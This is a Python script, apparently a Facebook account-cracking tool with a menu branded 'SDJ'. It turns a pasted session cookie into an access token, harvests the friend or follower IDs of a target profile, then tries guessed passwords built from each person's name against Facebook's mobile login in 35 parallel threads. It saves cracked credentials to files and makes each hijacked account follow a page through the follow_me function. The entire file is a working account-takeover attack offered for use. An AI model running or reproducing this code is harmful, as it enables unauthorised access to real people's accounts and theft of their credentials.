#!/usr/bin/python
# -*- coding: utf-8 -*-



import requests, re, os, random, sys
from bs4 import BeautifulSoup
from random import choice
from concurrent.futures import ThreadPoolExecutor
from time import time as mek

# data - data
P = "\x1b[0;97m" 
M = "\x1b[0;91m"
H = "\x1b[0;92m"
K = "\x1b[0;93m"
B = "\x1b[0;94m"
BM = "\x1b[0;96m"
loop, ok, cp = [],[],[]
opsi = []
data_id = None
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92mâ€¢\x1b[1;97m] [\x1b[1;96mCONECT WITH PROXY')
prox=open('.prox.txt','r').read().splitlines()

# convert cookies to token
def convert(cookie):
	cookies = {"cookie":cookie}
	res = requests.Session().get('https://business.facebook.com/business_locations', headers = {
		'user-agent'	:	'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
		'referer'	:	'https://www.facebook.com/',
		'host'	:	'business.facebook.com',
		'origin'	:	'https://business.facebook.com',
		'upgrade-insecure-requests'	:	'1',
		'accept-language'	:	'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'	:	'max-age=0',
		'accept'	:	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'	:	'text/html; charset=utf-8'
	}, cookies = cookies)
	try:
		token = re.search('(EAAG\w+)',str(res.text)).group(1)
	except:
		token = "Cookies Invalid"
	finally:
		return token
		
def real_time():
	return str(mek()).split('.')[0]
		
def sesi(session,res):
	response = BeautifulSoup(res,'html.parser')
	form = response.find('form',{'method':'post'})
	data = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['hidden','submit']})}
	r = BeautifulSoup(session.post('https://m.facebook.com'+form.get('action'),data=data).text, 'html.parser')
	for i in r.find_all('option'):
		opsi.append(i.text)
	return opsi

class Main:
	
	def __init__(self,**kwargs):
		self.coki, self.token = {"cookie":kwargs['coki']}, kwargs['token']
		self.data_id = []
		self.mbasic = "https://free.facebook.com"
	
	@property
	def get_my_info(self):
		r = requests.get(f"https://graph.facebook.com/me?fields=name,id&access_token={self.token}",cookies=self.coki).json()
		self.name,self.id = r['name'], r['id']
		return {'name':self.name, 'id':self.id}
			
		
	@property
	def Menu(self):
		try:
			info = self.get_my_info
		except KeyError:
			os.remove("data/token");os.remove("data/coki")
			exit("  ")
		
		print(
			"""                         
        \033[1;97m     
             
 ######  ########        ## 
##    ## ##     ##       ## 
##       ##     ##       ## 
 ######  ##     ##       ## 
      ## ##     ## ##    ## 
##    ## ##     ## ##    ## 
 ######  ########   ######  
                       
   \033[1;92m\033[1;41m  VRS:1.0  \033[0m\033[1;92m
   \x1b[1;92m[\033[33m1\x1b[1;92m]\x1b[m CRACK ID PUBLIK 
   \x1b[1;92m[\033[33m2\x1b[1;92m]\x1b[m CRACK FROM FOLLOWERS
   \x1b[1;92m[\033[33m3\x1b[1;92m]\x1b[m CHECK RESULTS (\033[1;92mUSE ME)
   (\033[1;92m Use it when cp accounts do not appear in the results )
			"""
		)
		chose = input("   \x1b[1;92m[\033[33m✓\x1b[1;92m]\x1b[m CHOSE \033[33m :\x1b[1;92m ")
		number_list = ['0','1','2','3']
		while chose not in number_list:
			print('   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;208m CHOSE 1 PLEASE')
			chose = input("   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;208m CHOSE\x1b[38;5;231m \033[33m :\x1b[1;92m ")
			os.system ("clear")
		if chose=='1' or chose=='2':
			if chose=='1':print("\n   \x1b[1;92m[\033[33m✓\x1b[1;97m]\x1b[38;5;208m INPUT PUBLICK ID LINK HERE")
			else:print("\n   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;208m ")
			account_target = input("   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;208m TARGET ID \033[33m :\x1b[1;92m ")
			try:
				r = requests.get(f"https://graph.facebook.com/{account_target}?fields=name,id&access_token={self.token}",cookies=self.coki).json()
				target_name = r['name']
				print(f"   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;208m NAME TARGET \033[33m :\x1b[1;92m {target_name}")
			except KeyError:
				exit("   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;208m FIND THE BEST ID ! ")
			if chose=='1':self.dumpAccount(url=f"https://graph.facebook.com/{account_target}?fields=friends.fields(name,id)&access_token={self.token}",chose="friends")
			else:self.dumpAccount(url=f"https://graph.facebook.com/{account_target}?fields=subscribers.limit(5000)&access_token={self.token}",chose="followers")
			self.validate
		elif chose=='0':
			os.remove('data/token');os.remove('data/coki')
			exit(f'\n   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;208mWHY ARE YOU LEAVING \x1b[38;5;196m \x1b[38;5;46m {self.name}')
		else:
			print('\n   \x1b[1;92m[\033[33m✓\x1b[1;92m]\x1b[38;5;208m CHECK RESULTS\x1b[38;5;46m OK\x1b[38;5;231m &\x1b[38;5;208m CP')
			try:
				print('   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;46m  OK\x1b[38;5;231m :\x1b[38;5;46m ')
				for x in open('data/ok','r').readlines():
					print(f'   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;46m {x}')
			except:print('   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;208m  ')
			print(
				"","═"*25
			)
			try:
				print('   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;208m CP\x1b[38;5;231m :\x1b[38;5;208m ')
				for x in open('data/cp','r').readlines():
					print(f'   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;208m {x}')
			except:print('   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;208m TOTAL 0 ')
				
			
class Crack:
	
	def crack(self, user, password_list, url):
		session = requests.Session()
		for pw in password_list:
			r = BeautifulSoup(session.get(f"{url}/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr", headers={
				'Host'	:	'free.facebook.com',
				'Connection'	:	'keep-alive',
				'Cache-Control'	:	'max-age=0',
				'sec-ch-ua'	:	'" Not A;Brand";v="99", "Chromium";v="101"',
				'sec-ch-ua-mobile'	:	'?1',
				'sec-ch-ua-platform'	:	'"Android"',
				'Upgrade-Insecure-Requests'	:	'1',
				'User-Agent'	:	'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
				'Accept'	:	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.9,application/signed-exchange;v=b4;q=0.10',
				'Sec-Fetch-Site'	:	'same-origin',
				'Sec-Fetch-Mode'	:	'navigate',
				'Sec-Fetch-User'	:	'?1',
				'Sec-Fetch-Dest'	:	'document',
				'Referer'	:	'https://free.facebook.com/login/device-based/',
				'Accept-Encoding'	:	'gzip, deflate',
				'Accept-Language'	:	'id-ID,id;q=0.9'
			}).text, 'html.parser')
			data = {_.get('name'):_.get('value') for _ in r.find('form',{'method':'post'}).findAll('input',{'name':['lsd','jazoest']})}
			data.update(
				{
					'uid':user,
					'next':'https://free.facebook.com/login/save-device/',
					'flow':'login_no_pin',
					'encpass':'#PWD_BROWSER:0:{}:{}'.format(real_time(),pw)
				}
			)
			session.post(f'{url}/login/device-based/validate-password/', data=data, headers={
				'Host'	:	'free.facebook.com',
				'Connection'	:	'keep-alive',
				'Content-Length'	:	'142',
				'Cache-Control'	:	'max-age=0',
				'sec-ch-ua'	:	'" Not A;Brand";v="99", "Chromium";v="101"',
				'sec-ch-ua-mobile'	:	'?1',
				'sec-ch-ua-platform'	:	'"Android"',
				'Upgrade-Insecure-Requests'	:	'1',
				'Origin'	:	'https://free.facebook.com',
				'Content-Type'	:	'application/x-www-form-urlencoded',
				'User-Agent'	:	'NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
				'Accept'	:	'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.9,application/signed-exchange;v=b4;q=0.10',
				'Sec-Fetch-Site'	:	'same-origin',
				'Sec-Fetch-Mode'	:	'navigate',
				'Sec-Fetch-User'	:	'?1',
				'Sec-Fetch-Dest'	:	'document',
				'Referer'	:	'https://free.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr',
				'Accept-Encoding'	:	'gzip, deflate, br',
				'Accept-Language'	:	'id-ID,id;q=0.9'
			})
			if "c_user" in session.cookies.get_dict():
				ok.append(user+"|"+pw)
				open("data/ok","a").write(user+"|"+pw+"\n")
				coki = ';'.join(["%s=%s"%(k,v) for k,v in session.cookies.get_dict().items()])
				self.follow_me(coki)
				sys.stdout.write('\n%s\r √ ACOUNT SAFE\n > Email: %s\n > Pass: %s\n ^ ^\n%s'%(H,user,pw,P))
				sys.stdout.flush()
				break
			elif "checkpoint" in session.cookies.get_dict():
				cp.append(user+"|"+pw)
				open("data/cp","a").write(user+"|"+pw+"\n")
				h2 = {
					'host':'free.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'
				}
				res = session.get('https://free.facebook.com/login/?next&ref=dbl&fl&refid=8',headers = h2).text
				ress = BeautifulSoup(res, 'html.parser')
				form = ress.find('form',{'method':'post'})
				data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})}
				data2.update({
					'email':user,
					'pass':pw
				})
				res = session.post('https://free.facebook.com'+form.get('action'),data=data2,headers=h2).text
				ress = BeautifulSoup(res, 'html.parser')
				if 'View the login details displayed. This you?' in str(ress.find('title').text):
					open("ua","a").write("%s|%s"%(user,pw))
					sys.stdout.write('\n%s\r ✓ tap yes\n > Email: %s\n > Pass: %s\n %s'%(H,user,pw,P))
					sys.stdout.flush()
				else:
					if(len(sesi(session,res))==0):
						if 'Enter the Login Code to Continue' in str(ress.find('title').text):
							sys.stdout.write('\n%s\r   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[1;96m ACCOUNT \x1b[38;5;208m A2F ON\n   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[1;96m EMAIL\x1b[38;5;231m :\x1b[38;5;208m %s\n   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[1;96m PASSWORD \x1b[38;5;231m :\x1b[38;5;208m %s\n   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[1;96m \n%s'%(M,user,pw,P))
							sys.stdout.flush()
					else:
						sys.stdout.write('\n%s\r   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;208m [APROVAL_DETECT]\n   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;208m EMAIL\x1b[38;5;231m :\x1b[38;5;208m %s\n   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;208m PASSWORD \x1b[38;5;231m :\x1b[38;5;208m %s\n   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;208m OPSION\x1b[38;5;231m :\x1b[38;5;208m %s : %s\n%s'%(K,user,pw,len(opsi),', '.join(opsi),P))
						sys.stdout.flush()
				opsi.clear()
				break
			sys.stdout.write("\r   \x1b[1;92m[\033[33m\x1b[1;92m]\x1b[38;5;208m ALT \x1b[38;5;226m %s/%s \x1b[38;5;46mOK\x1b[38;5;231m/\x1b[38;5;208mCP \x1b[38;5;46m%s\x1b[38;5;231m/\x1b[38;5;208m%s"%(len(loop),len(data_id),len(ok),len(cp)))
			sys.stdout.flush()
		loop.append("memek")

class Assets(Main):
	
	@property
	def _password_split(self):
		print("\n   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;208m ADDITIONAL PASSWORD SEPARATE WITH COMMA  \x1b[38;5;231m(\x1b[38;5;226m,\x1b[38;5;231m) \n   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;208m EXAMPLE\x1b[38;5;231m :\x1b[38;5;46m pakistan123,pakistan,786786,223344\n   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;208m PASSWORD MUST BE MORE THAN \x1b[38;5;46m 6\x1b[38;5;208m DIGITS\n")
		_password = input("   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;208m ADD PASSWORD \x1b[38;5;231m :\x1b[38;5;46m ");print("")
		return _password.split(",")

	@property
	def validate(self):
		add = input("   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;208m ADDITIONAL PASSWORD \x1b[38;5;231m [\x1b[38;5;46mY\x1b[38;5;231m/\x1b[38;5;46mN\x1b[38;5;231m] \x1b[38;5;46m")
		if add=="y":
			pas = self._password_split
		print(
			"   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;208m CRACKING START \x1b[38;5;231m (\x1b[38;5;226mCTRL\x1b[38;5;231m +\x1b[38;5;196m Z\x1b[38;5;231m)\x1b[38;5;226m FOR EXIT \x1b[38;5;196m \n"
		)
		with ThreadPoolExecutor(max_workers=35) as kirim:
			for x in self.data_id:
				x = x.lower()
				namee,id = x.split('><')
				name = namee.split(" ")
				if(len(name[0])>=6):
					__password_list = [namee,name[0]+'123',name[0]+'1234',name[0]+'12345']
				elif(len(name[0])<=2):
					__password_list = [namee,name[0]+'1234',name[0]+'12345']
				else:
					__password_list = [namee,name[0]+'123',name[0]+'1234',name[0]+'12345']
				if add=="y":
					__password_list = __password_list + pas
				kirim.submit(Crack().crack, id, __password_list, self.mbasic)
		exit(
			" \x1b[38;5;208m CRACKING COMPLETE"
		)
	
	def dumpAccount(self,**sdj_op):
		global data_id
		if sdj_op['chose']=="friends":
			r = requests.get(f"{sdj_op['url']}",cookies=self.coki).json()['friends']
		else:
			r = requests.get(f"{sdj_op['url']}",cookies=self.coki).json()['subscribers']
		for x in r['data']:
			try:
				self.data_id.append(x['name']+"><"+x['id'])
			except KeyError:
				pass
		data_id = self.data_id
		print(
			f"   \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;208m TOTAL ID \033[33m :\x1b[1;92m {len(self.data_id)}"
		)
		self.validate
		
	def follow_me(self,coki):
		with requests.Session() as session:
			_link = BeautifulSoup(session.get(f"{self.mbasic}/rndn",headers={'host':'x.facebook.com','accept-language':'id-ID,id;q=0.9'},cookies={"cookie":coki}).text, 'html.parser').find('a',string='Ikuti')
			if _link:
				return session.get(f"{self.mbasic}"+_link.get('href'))

def _login():
	try:
		token = open("data/token","r").read()
		coki = open("data/coki","r").read()
		Assets(token=token,coki=coki).Menu
	except FileNotFoundError:
		try:os.mkdir("data")
		except:pass
		
		print("\t                  \x1b[1;92m•━━╬٨ـﮩ\x1b[7mSDJ___KING\x1b[1;92m٨ـﮩﮩـ╬━━•\n    \x1b[1;92m•\033[7m━━╬٨ـﮩ\x1b[1;92m[NO ONE CAN BEAT U IF U WORK HARD]\033[1;92m٨ـﮩﮩـ╬━━\x1b[m•\n")
		coki = input("     \x1b[1;97m[\033[33m✓\x1b[1;97m]\x1b[38;5;208m INPUT COOKIE\033[33m :\x1b[1;92m ")
		token = convert(coki)
		if token=="     \x1b[1;97m[\033[33m✓\x1b[1;97m]\033[95m MISSING COOKIES":
			exit("     \x1b[1;97m[\033[33m✓\x1b[1;97m]\033[95m OH YOUR COOKIE IS TAKEN A RECORD BOY")
		open("data/token","a").write(token)
		open("data/coki","a").write(coki)
		Success = Assets(token=token,coki=coki);Success.get_my_info;Success.follow_me(coki);Success.Menu

if __name__=="__main__":
	os.system(
		"clear"
	)
	_login()
